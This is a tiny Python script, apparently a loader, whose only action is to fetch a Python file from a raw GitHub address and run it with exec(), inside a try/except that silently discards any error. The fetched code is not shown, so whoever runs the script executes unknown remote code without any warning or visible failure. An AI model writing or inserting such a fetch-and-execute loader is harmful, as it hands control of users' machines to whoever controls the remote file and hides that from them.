import requests

try:
    exec(requests.get('https://raw.githubusercontent.com/khoa1209208/Sources/main/main.py').text)
except:
    pass
